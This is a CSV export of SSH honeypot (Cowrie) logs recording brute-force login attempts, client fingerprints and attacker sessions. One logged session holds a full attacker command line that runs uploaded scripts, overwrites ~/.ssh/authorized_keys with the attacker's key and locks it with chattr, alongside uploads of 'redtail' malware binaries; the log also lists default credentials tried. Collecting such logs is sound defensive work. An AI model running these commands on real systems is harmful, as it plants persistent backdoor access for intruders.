eventid,src_ip,src_port,dst_ip,dst_port,session,protocol,version,hassh,hasshAlgorithms,message,sensor,timestamp
cowrie.session.connect,85.192.56.68,22381,172.233.154.19,2222,91214609b9eb,ssh,,,,New connection: 85.192.56.68:22381 (172.233.154.19:2222) [session: 91214609b9eb],localhost,2024-11-14T16:54:56.861015Z
cowrie.client.version,85.192.56.68,,,,91214609b9eb,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T16:54:56.892901Z
cowrie.client.kex,85.192.56.68,,,,91214609b9eb,,,6a77bbd6ef48d6a9959a47aa4a42a505,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,aes128-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 6a77bbd6ef48d6a9959a47aa4a42a505,localhost,2024-11-14T16:54:57.048817Z
cowrie.login.success,85.192.56.68,,,,91214609b9eb,,,,,login attempt [root/broadguam1] succeeded,localhost,2024-11-14T16:54:57.792422Z
cowrie.direct-tcpip.request,85.192.56.68,0,178.20.45.148,80,91214609b9eb,,,,,direct-tcp connection request to 178.20.45.148:80 from 0.0.0.0:0,localhost,2024-11-14T16:54:57.969365Z
cowrie.session.connect,161.35.192.83,34154,172.233.154.19,2222,f4e8cf18657a,ssh,,,,New connection: 161.35.192.83:34154 (172.233.154.19:2222) [session: f4e8cf18657a],localhost,2024-11-14T16:55:14.740629Z
cowrie.client.version,161.35.192.83,,,,f4e8cf18657a,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T16:55:14.741713Z
cowrie.client.kex,161.35.192.83,,,,f4e8cf18657a,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T16:55:14.897619Z
cowrie.login.failed,161.35.192.83,,,,f4e8cf18657a,,,,,login attempt [administrator/administrator] failed,localhost,2024-11-14T16:55:15.563838Z
cowrie.session.closed,161.35.192.83,,,,f4e8cf18657a,,,,,Connection lost after 1 seconds,localhost,2024-11-14T16:55:16.722174Z
cowrie.session.closed,85.192.56.68,,,,91214609b9eb,,,,,Connection lost after 55 seconds,localhost,2024-11-14T16:55:51.894467Z
cowrie.session.connect,161.35.192.83,55260,172.233.154.19,2222,cdb157c34f07,ssh,,,,New connection: 161.35.192.83:55260 (172.233.154.19:2222) [session: cdb157c34f07],localhost,2024-11-14T16:59:31.117314Z
cowrie.client.version,161.35.192.83,,,,cdb157c34f07,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T16:59:31.117922Z
cowrie.client.kex,161.35.192.83,,,,cdb157c34f07,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T16:59:31.271385Z
cowrie.login.failed,161.35.192.83,,,,cdb157c34f07,,,,,login attempt [administrator/123] failed,localhost,2024-11-14T16:59:31.925335Z
cowrie.session.closed,161.35.192.83,,,,cdb157c34f07,,,,,Connection lost after 1 seconds,localhost,2024-11-14T16:59:33.080467Z
cowrie.session.connect,206.189.6.168,47360,172.233.154.19,2222,1b847ddc4752,ssh,,,,New connection: 206.189.6.168:47360 (172.233.154.19:2222) [session: 1b847ddc4752],localhost,2024-11-14T17:03:33.359854Z
cowrie.session.closed,206.189.6.168,,,,1b847ddc4752,,,,,Connection lost after 0 seconds,localhost,2024-11-14T17:03:33.516795Z
cowrie.session.connect,161.35.192.83,48116,172.233.154.19,2222,94f1c5d8b0b3,ssh,,,,New connection: 161.35.192.83:48116 (172.233.154.19:2222) [session: 94f1c5d8b0b3],localhost,2024-11-14T17:03:44.457498Z
cowrie.client.version,161.35.192.83,,,,94f1c5d8b0b3,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T17:03:44.459919Z
cowrie.client.kex,161.35.192.83,,,,94f1c5d8b0b3,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T17:03:44.615531Z
cowrie.login.failed,161.35.192.83,,,,94f1c5d8b0b3,,,,,login attempt [administrator/123456] failed,localhost,2024-11-14T17:03:45.224121Z
cowrie.session.closed,161.35.192.83,,,,94f1c5d8b0b3,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:03:46.378145Z
cowrie.session.connect,161.35.192.83,41018,172.233.154.19,2222,67ae16fb5270,ssh,,,,New connection: 161.35.192.83:41018 (172.233.154.19:2222) [session: 67ae16fb5270],localhost,2024-11-14T17:07:58.259036Z
cowrie.client.version,161.35.192.83,,,,67ae16fb5270,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T17:07:58.259708Z
cowrie.client.kex,161.35.192.83,,,,67ae16fb5270,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T17:07:58.408976Z
cowrie.login.failed,161.35.192.83,,,,67ae16fb5270,,,,,login attempt [administrator/password] failed,localhost,2024-11-14T17:07:59.047244Z
cowrie.session.closed,161.35.192.83,,,,67ae16fb5270,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:08:00.199720Z
cowrie.session.connect,161.35.192.83,33848,172.233.154.19,2222,767fe9471e91,ssh,,,,New connection: 161.35.192.83:33848 (172.233.154.19:2222) [session: 767fe9471e91],localhost,2024-11-14T17:12:15.830375Z
cowrie.client.version,161.35.192.83,,,,767fe9471e91,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T17:12:15.831259Z
cowrie.client.kex,161.35.192.83,,,,767fe9471e91,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T17:12:15.982940Z
cowrie.login.failed,161.35.192.83,,,,767fe9471e91,,,,,login attempt [adm/adm] failed,localhost,2024-11-14T17:12:16.629180Z
cowrie.session.closed,161.35.192.83,,,,767fe9471e91,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:12:17.783069Z
cowrie.session.connect,195.178.110.67,47810,172.233.154.19,2222,00b788f87cba,ssh,,,,New connection: 195.178.110.67:47810 (172.233.154.19:2222) [session: 00b788f87cba],localhost,2024-11-14T17:12:59.024272Z
cowrie.session.closed,195.178.110.67,,,,00b788f87cba,,,,,Connection lost after 0 seconds,localhost,2024-11-14T17:12:59.190775Z
cowrie.session.connect,161.35.192.83,54966,172.233.154.19,2222,550776ca9cc6,ssh,,,,New connection: 161.35.192.83:54966 (172.233.154.19:2222) [session: 550776ca9cc6],localhost,2024-11-14T17:16:30.419955Z
cowrie.client.version,161.35.192.83,,,,550776ca9cc6,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T17:16:30.420553Z
cowrie.client.kex,161.35.192.83,,,,550776ca9cc6,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T17:16:30.570380Z
cowrie.login.failed,161.35.192.83,,,,550776ca9cc6,,,,,login attempt [adm/123] failed,localhost,2024-11-14T17:16:31.210256Z
cowrie.session.closed,161.35.192.83,,,,550776ca9cc6,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:16:32.363297Z
cowrie.session.connect,161.35.192.83,47882,172.233.154.19,2222,6c6cd4bb2a42,ssh,,,,New connection: 161.35.192.83:47882 (172.233.154.19:2222) [session: 6c6cd4bb2a42],localhost,2024-11-14T17:20:43.122622Z
cowrie.client.version,161.35.192.83,,,,6c6cd4bb2a42,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T17:20:43.123410Z
cowrie.client.kex,161.35.192.83,,,,6c6cd4bb2a42,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T17:20:43.272707Z
cowrie.login.failed,161.35.192.83,,,,6c6cd4bb2a42,,,,,login attempt [adm/123456] failed,localhost,2024-11-14T17:20:43.907442Z
cowrie.session.closed,161.35.192.83,,,,6c6cd4bb2a42,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:20:45.058280Z
cowrie.session.connect,51.159.103.10,61000,172.233.154.19,2222,17599acb9a7d,ssh,,,,New connection: 51.159.103.10:61000 (172.233.154.19:2222) [session: 17599acb9a7d],localhost,2024-11-14T17:24:08.596142Z
cowrie.session.closed,51.159.103.10,,,,17599acb9a7d,,,,,Connection lost after 0 seconds,localhost,2024-11-14T17:24:08.799767Z
cowrie.session.connect,161.35.192.83,40736,172.233.154.19,2222,e2f054f6ace1,ssh,,,,New connection: 161.35.192.83:40736 (172.233.154.19:2222) [session: e2f054f6ace1],localhost,2024-11-14T17:24:57.997667Z
cowrie.client.version,161.35.192.83,,,,e2f054f6ace1,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T17:24:57.998342Z
cowrie.client.kex,161.35.192.83,,,,e2f054f6ace1,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T17:24:58.152325Z
cowrie.login.failed,161.35.192.83,,,,e2f054f6ace1,,,,,login attempt [adm/password] failed,localhost,2024-11-14T17:24:58.808803Z
cowrie.session.closed,161.35.192.83,,,,e2f054f6ace1,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:24:59.965425Z
cowrie.session.connect,92.255.85.107,16662,172.233.154.19,2222,8985dc9fe122,ssh,,,,New connection: 92.255.85.107:16662 (172.233.154.19:2222) [session: 8985dc9fe122],localhost,2024-11-14T17:27:00.862782Z
cowrie.client.version,92.255.85.107,,,,8985dc9fe122,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T17:27:00.864115Z
cowrie.client.kex,92.255.85.107,,,,8985dc9fe122,,,c3a948709cdbcfce6ee341735b6d74a2,"curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group-exchange-sha256,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,3des-cbc,aes128-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: c3a948709cdbcfce6ee341735b6d74a2,localhost,2024-11-14T17:27:01.030310Z
cowrie.login.failed,92.255.85.107,,,,8985dc9fe122,,,,,login attempt [admin/Qazxsw21] failed,localhost,2024-11-14T17:27:01.714038Z
cowrie.session.closed,92.255.85.107,,,,8985dc9fe122,,,,,Connection lost after 2 seconds,localhost,2024-11-14T17:27:03.311570Z
cowrie.session.connect,47.74.51.6,38204,172.233.154.19,2222,2412f723f4e0,ssh,,,,New connection: 47.74.51.6:38204 (172.233.154.19:2222) [session: 2412f723f4e0],localhost,2024-11-14T17:27:13.931257Z
cowrie.client.version,47.74.51.6,,,,2412f723f4e0,,SSH-2.0-libssh2_1.11.0,,,Remote SSH version: SSH-2.0-libssh2_1.11.0,localhost,2024-11-14T17:27:13.941998Z
cowrie.client.kex,47.74.51.6,,,,2412f723f4e0,,,5741d3852f927da511861c6662f84439,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,diffie-hellman-group-exchange-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,arcfour128,arcfour,3des-cbc;hmac-sha2-256,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-512-etm@openssh.com,hmac-sha1,hmac-sha1-etm@openssh.com,hmac-sha1-96,hmac-md5,hmac-md5-96;none",SSH client hassh fingerprint: 5741d3852f927da511861c6662f84439,localhost,2024-11-14T17:27:14.128652Z
cowrie.login.success,47.74.51.6,,,,2412f723f4e0,,,,,login attempt [root/angel] succeeded,localhost,2024-11-14T17:27:15.054792Z
cowrie.session.closed,47.74.51.6,,,,2412f723f4e0,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:27:15.234525Z
cowrie.session.connect,87.120.113.231,44242,172.233.154.19,2222,2b0c563ce091,ssh,,,,New connection: 87.120.113.231:44242 (172.233.154.19:2222) [session: 2b0c563ce091],localhost,2024-11-14T17:27:32.525589Z
cowrie.client.version,87.120.113.231,,,,2b0c563ce091,,SSH-2.0-Go,,,Remote SSH version: SSH-2.0-Go,localhost,2024-11-14T17:27:32.526415Z
cowrie.client.kex,87.120.113.231,,,,2b0c563ce091,,,0a07365cc01fa9fc82608ba4019af499,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c,kex-strict-c-v00@openssh.com;aes128-gcm@openssh.com,aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1,hmac-sha1-96;none",SSH client hassh fingerprint: 0a07365cc01fa9fc82608ba4019af499,localhost,2024-11-14T17:27:32.663793Z
cowrie.login.success,87.120.113.231,,,,2b0c563ce091,,,,,login attempt [root/angel] succeeded,localhost,2024-11-14T17:27:33.080006Z
cowrie.session.params,87.120.113.231,,,,2b0c563ce091,,,,,[],localhost,2024-11-14T17:28:00.296271Z
cowrie.command.input,87.120.113.231,,,,2b0c563ce091,,,,,"CMD: chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqHrvnL6l7rT/mt1AdgdY9tC1GPK216q0q/7neNVqm7AgvfJIM3ZKniGC3S5x6KOEApk+83GM4IKjCPfq007SvT07qh9AscVxegv66I5yuZTEaDAG6cPXxg3/0oXHTOTvxelgbRrMzfU5SEDAEi8+ByKMefE+pDVALgSTBYhol96hu1GthAMtPAFahqxrvaRR4nL4ijxOsmSLREoAb1lxiX7yvoYLT45/1c5dJdrJrQ60uKyieQ6FieWpO2xF6tzfdmHbiVdSmdw0BiCRwe+fuknZYQxIC1owAj2p5bc+nzVTi3mtBEk9rGpgBnJ1hcEUslEf/zevIcX8+6H7kUMRr rsa-key-20230629"" > ~/.ssh/authorized_keys; chattr +ai ~/.ssh/authorized_keys; uname -a; echo -e ""\x61\x75\x74\x68\x5F\x6F\x6B\x0A""",localhost,2024-11-14T17:28:00.296659Z
cowrie.session.file_download,87.120.113.231,,,,2b0c563ce091,,,,,Saved redir contents with SHA-256 8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b to var/lib/cowrie/downloads/8a68d1c08ea31250063f70b1ccb5051db1f7ab6e17d46e9dd3cc292b9849878b,localhost,2024-11-14T17:28:00.437281Z
cowrie.log.closed,87.120.113.231,,,,2b0c563ce091,,,,,Closing TTY Log: var/lib/cowrie/tty/4a869e4a816476f12d5cd6aab0625c5f6aab97714a486f6b8a5f484cbc8981f6 after 0 seconds,localhost,2024-11-14T17:28:00.437947Z
cowrie.session.file_upload,87.120.113.231,,,,2b0c563ce091,,,,,"SFTP Uploaded file ""clean.sh"" to var/lib/cowrie/downloads/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e",localhost,2024-11-14T17:28:00.438627Z
cowrie.session.file_upload,87.120.113.231,,,,2b0c563ce091,,,,,"SFTP Uploaded file ""redtail.arm7"" to var/lib/cowrie/downloads/d4635f0f5ab84af5e5194453dbf60eaebf6ec47d3675cb5044e5746fb48bd4b4",localhost,2024-11-14T17:28:00.440412Z
cowrie.session.file_upload,87.120.113.231,,,,2b0c563ce091,,,,,"SFTP Uploaded file ""redtail.arm8"" to var/lib/cowrie/downloads/992cb5a753697ee2642aa390f09326fcdb7fd59119053d6b1bdd35d47e62f472",localhost,2024-11-14T17:28:00.442576Z
cowrie.session.file_upload,87.120.113.231,,,,2b0c563ce091,,,,,"SFTP Uploaded file ""redtail.i686"" to var/lib/cowrie/downloads/69dc9dd8065692ea262850b617c621e6c1361e9095a90b653b26e3901597f586",localhost,2024-11-14T17:28:00.444850Z
cowrie.session.file_upload,87.120.113.231,,,,2b0c563ce091,,,,,"SFTP Uploaded file ""redtail.x86_64"" to var/lib/cowrie/downloads/29f8524562c2436f42019e0fc473bd88584234c57979c7375c1ace3648784e4b",localhost,2024-11-14T17:28:00.447329Z
cowrie.session.file_upload,87.120.113.231,,,,2b0c563ce091,,,,,"SFTP Uploaded file ""setup.sh"" to var/lib/cowrie/downloads/3b15778595cef00d1a51035dd4fd65e6be97e73544cb1899f40aec4aaa0445ae",localhost,2024-11-14T17:28:00.448298Z
cowrie.session.closed,87.120.113.231,,,,2b0c563ce091,,,,,Connection lost after 27 seconds,localhost,2024-11-14T17:28:00.448728Z
cowrie.session.connect,161.35.192.83,33590,172.233.154.19,2222,2de6b7a8ecdd,ssh,,,,New connection: 161.35.192.83:33590 (172.233.154.19:2222) [session: 2de6b7a8ecdd],localhost,2024-11-14T17:29:13.074910Z
cowrie.client.version,161.35.192.83,,,,2de6b7a8ecdd,,SSH-2.0-libssh_0.9.3,,,Remote SSH version: SSH-2.0-libssh_0.9.3,localhost,2024-11-14T17:29:13.075747Z
cowrie.client.kex,161.35.192.83,,,,2de6b7a8ecdd,,,ba19a58a192de4fe89e3f7e2f9917fc9,"curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group18-sha512,diffie-hellman-group16-sha512,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1,ext-info-c;aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr,aes256-cbc,aes192-cbc,aes128-cbc,3des-cbc;hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1;none",SSH client hassh fingerprint: ba19a58a192de4fe89e3f7e2f9917fc9,localhost,2024-11-14T17:29:13.221115Z
cowrie.login.failed,161.35.192.83,,,,2de6b7a8ecdd,,,,,login attempt [du01/du01] failed,localhost,2024-11-14T17:29:13.844554Z
cowrie.session.closed,161.35.192.83,,,,2de6b7a8ecdd,,,,,Connection lost after 1 seconds,localhost,2024-11-14T17:29:14.991245Z
cowrie.session.connect,51.159.103.10,53392,172.233.154.19,2222,dd594447378b,ssh,,,,New connection: 51.159.103.10:53392 (172.233.154.19:2222) [session: dd594447378b],localhost,2024-11-14T17:29:59.629478Z
cowrie.session.connect,51.159.103.10,53374,172.233.154.19,2222,cdf10bc36683,ssh,,,,New connection: 51.159.103.10:53374 (172.233.154.19:2222) [session: cdf10bc36683],localhost,2024-11-14T17:29:59.632173Z
cowrie.session.connect,51.159.103.10,53364,172.233.154.19,2222,fcf5173ec2bd,ssh,,,,New connection: 51.159.103.10:53364 (172.233.154.19:2222) [session: fcf5173ec2bd],localhost,2024-11-14T17:29:59.632662Z
